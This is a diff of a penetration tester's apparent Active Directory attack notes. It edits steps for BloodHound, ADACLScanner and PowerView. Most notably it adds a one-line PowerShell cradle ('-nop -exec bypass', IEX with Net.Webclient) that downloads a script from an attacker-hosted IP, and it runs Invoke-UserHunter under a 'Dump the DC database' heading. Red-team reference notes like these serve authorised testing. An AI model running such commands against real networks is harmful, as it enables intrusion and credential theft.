@@ -67,18 +67,12 @@ cd /opt/BloodHound-3/BloodHound-linux-x64/
 ./BloodHound --no-sandbox
 Login
 Drag and drop the zip file into the UI
-------------------------------------------------------------------------------------------------------
-
-# PowerView
-
-See discover/notes/PowerShell/PowerView.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # ADACLScanner
 
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
-powershell.exe -nop -exec bypass
-iex (new-object net.webclient).downloadfile('http://192.168.1.5/ADACLScan.ps1', 'ADACLScan.ps1')
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/ADACLScan.ps1', 'ADACLScan.ps1')"
 
 .\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
 
@@ -240,7 +234,7 @@ dsquery partition
 
 # Dump the DC database
 
-powershell.exe -nop -exec bypass
+powershell -nop -exec bypass
 Import-Module PowerView
 Invoke-UserHunter
 Import-Module PowerSploit
